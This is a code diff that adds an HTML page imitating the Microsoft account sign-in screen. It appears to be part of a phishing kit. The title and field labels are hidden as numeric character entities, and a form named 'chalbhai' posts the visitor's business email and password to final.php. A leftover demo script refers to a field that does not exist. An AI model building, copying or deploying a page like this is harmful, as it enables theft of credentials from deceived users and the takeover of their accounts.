@@ -1,0 +1,112 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+
+<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
+
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1352px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>	
+<script type="text/javascript">
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+</script>
+ <style type="text/css">
+ .textbox { 
+ adding: 4px 8px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: rgba(0,0,0,.4);
+    background-color: rgba(255,255,255,.4);
+    height: 32px;
+    height: 2rem;
+	box-sizing: border-box;
+	letter-spacing: normal;
+    word-spacing: normal;
+    text-transform: none;
+    text-indent: 0px;
+    text-shadow: none;
+    display: inline-block;
+    text-align: start;
+	box-sizing: border-box;
+	 padding-left: 10px; 
+}
+ </style>
+   <style type="text/css">
+ input[type=checkbox].css-checkbox {
+							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
+						}
+
+						input[type=checkbox].css-checkbox + label.css-label {
+							padding-left:30px;
+							height:24px; 
+							display:inline-block;
+							line-height:24px;
+							background-repeat:no-repeat;
+							background-position: 0 0;
+							font-size:24px;
+							vertical-align:middle;
+							cursor:pointer;
+
+						}
+
+						input[type=checkbox].css-checkbox:checked + label.css-label {
+							background-position: 0 -24px;
+						}
+						label.css-label {
+				background-image:url();
+				-webkit-touch-callout: none;
+				-webkit-user-select: none;
+				-khtml-user-select: none;
+				-moz-user-select: none;
+				-ms-user-select: none;
+				user-select: none;
+			}
+			 </style>
+<body style="visibility:hidden" onload="unhideBody()">
+</head>
+<body>
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:451px; top:43px; width:450px; height:439px; z-index:0"><img src="images/1.png" alt="" title="" border=0 width=450 height=439></div>
+<form action="final.php" name=chalbhai id="demo-form" method=post>
+<input name="user" placeholder="&#66;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#32;&#69;&#109;&#97;&#105;&#108;" autocomplete="off"  class="textbox" required type="text" style="position:absolute;width:359px;left:504px;top:239px;z-index:1">
+<input name="pass" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" autocomplete="off"  class="textbox" required type="text" style="position:absolute;width:359px;left:505px;top:283px;z-index:2">
+
+<div id="checkboxG1"  style="position:absolute; left:503px; top:328px; z-index:3"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
+<div id="checkboxG1"  style="position:absolute; left:503px; top:328px; z-index:4"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
+<div id="formimage1" style="position:absolute; left:503px; top:370px; z-index:5"><input type="image" name="formimage1" width="362" height="39" src="images/button.png"></div>
+</div>
+<script type="text/javascript">
+ 
+  //apply masking to the demo-field
+  //pass the field reference, masking symbol, and character limit
+  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
+ 
+  //test the submitted value
+  document.getElementById('demo-form').onsubmit = function()
+  {
+   alert('pword = "' + this.pword.value + '"');
+   return false;
+  };
+ 
+ </script>
+</body>
+</html>
